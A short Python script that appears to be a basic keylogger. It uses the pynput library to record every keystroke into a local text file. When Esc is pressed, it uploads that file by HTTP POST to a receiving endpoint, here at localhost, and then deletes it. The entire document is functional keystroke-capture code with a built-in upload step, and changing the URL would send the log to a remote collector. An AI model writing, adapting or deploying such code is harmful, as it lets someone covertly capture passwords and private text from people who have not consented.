import requests
from pynput import keyboard
import os

def send_key_log():
    url = "http://localhost:5000/receive_log"
    try:
        with open("key_log.txt", "rb") as file:
            files = {"file": file}
            response = requests.post(url, files=files)
            print(f"Server Response: {response.text}")
    except Exception as e:
        print(f"Error sending log: {e}")
    finally:
        if os.path.exists("key_log.txt"):
            os.remove("key_log.txt")
            print("Keystroke log file removed.")
        else:
            print("No keystroke log file to remove.")

def save_key(key):
    key_str = str(key).replace('Key.', '').replace("'", "")
    with open("key_log.txt", "a") as file:
        file.write(f"{key_str} ")

def on_press(key):
    key_str = str(key).replace('Key.', '').replace("'", "")
    print(key_str, end=" ")
    save_key(key)
    # You can also handle special keys here if needed

def on_release(key):
    if key == keyboard.Key.esc:
        send_key_log()
        # Returning False stops the listener
        return False

# Use a single listener for both key press and release events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
